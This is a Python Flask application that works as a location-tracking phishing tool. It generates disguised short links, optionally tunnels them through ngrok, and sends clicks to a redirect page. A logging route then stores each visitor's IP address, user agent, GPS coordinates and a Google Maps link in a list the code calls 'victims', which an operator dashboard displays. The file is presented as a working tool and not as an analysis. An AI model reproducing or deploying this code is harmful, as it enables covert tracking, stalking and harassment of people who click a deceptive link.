from flask import Flask, render_template, request, jsonify
import subprocess
import threading
import requests
import random
import string
import time

app = Flask(__name__)
victims = []
victims_lock = threading.Lock()  # Lock for thread safety
short_urls = {}

# ------------------------
# UTILS
# ------------------------

def generate_short_id(length=6):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def start_ngrok(token, result_container):
    """Start ngrok in a separate thread with the provided auth token."""
    try:
        subprocess.run(['ngrok', 'config', 'add-authtoken', token], check=True)
        ngrok_proc = subprocess.Popen(["ngrok", "http", "5000"])
        time.sleep(4)
        ngrok_data = requests.get("http://127.0.0.1:4040/api/tunnels").json()
        public_url = ngrok_data['tunnels'][0]['public_url']
        result_container['url'] = public_url
        result_container['proc'] = ngrok_proc
    except Exception as e:
        result_container['error'] = str(e)

# ------------------------
# ROUTES
# ------------------------

@app.route('/', methods=['GET', 'POST'])
def index():
    short_link = None
    error = None
    public_url = None

    if request.method == 'POST':
        option = request.form.get('option')
        token = request.form.get('token', '').strip()
        redirect_url = request.form.get('redirect_url', '').strip()

        if not redirect_url.startswith("http"):
            error = "Invalid redirect URL."
            return render_template("index.html", victims=victims, short_link=None, error=error)

        if option == "ngrok":
            if not token:
                error = "Ngrok token is required."
                return render_template("index.html", victims=victims, short_link=None, error=error)

            # Run ngrok in a separate thread to avoid blocking
            result_container = {}
            ngrok_thread = threading.Thread(target=start_ngrok, args=(token, result_container))
            ngrok_thread.start()
            ngrok_thread.join(timeout=10)  # Wait max 10 seconds

            if 'error' in result_container:
                error = f"Ngrok error: {result_container['error']}"
                return render_template("index.html", victims=victims, short_link=None, error=error)
            public_url = result_container.get('url')
            if not public_url:
                error = "Ngrok did not provide a public URL in time."
                return render_template("index.html", victims=victims, short_link=None, error=error)

        elif option == "localhost":
            public_url = "http://127.0.0.1:5000"
        else:
            error = "Please choose a valid option."
            return render_template("index.html", victims=victims, short_link=None, error=error)

        short_id = generate_short_id()
        short_urls[short_id] = redirect_url
        short_link = f"{public_url}/redirect?link={short_id}"

    return render_template("index.html", victims=victims, short_link=short_link, error=error)

@app.route('/redirect')
def redirect_page():
    short_id = request.args.get("link")
    next_url = short_urls.get(short_id, "https://google.com")
    return render_template("redirect.html", next_url=next_url)

@app.route("/log_location")
def log_location():
    latitude = request.args.get("latitude", "N/A")
    longitude = request.args.get("longitude", "N/A")
    accuracy = request.args.get("accuracy", "N/A")
    user_agent = request.args.get("user_agent", "N/A")
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)

    # Basic sanitation (strip and max length)
    latitude = latitude.strip()[:20]
    longitude = longitude.strip()[:20]
    accuracy = accuracy.strip()[:10]
    user_agent = user_agent.strip()[:300]
    ip = ip.strip()[:45]

    victim = {
        "ip": ip,
        "user_agent": user_agent,
        "latitude": latitude,
        "longitude": longitude,
        "accuracy": accuracy,
        "maps_link": f"https://www.google.com/maps?q={latitude},{longitude}" if latitude != "N/A" and longitude != "N/A" else "N/A"
    }

    with victims_lock:
        victims.append(victim)

    return jsonify({"status": "logged"})

# NEW ROUTE for refreshing victim data via AJAX
@app.route('/refresh_victims')
def refresh_victims():
    with victims_lock:
        return jsonify({"victims": victims})

# ------------------------
# RUN FLASK
# ------------------------

if __name__ == '__main__':
    app.run(debug=True)
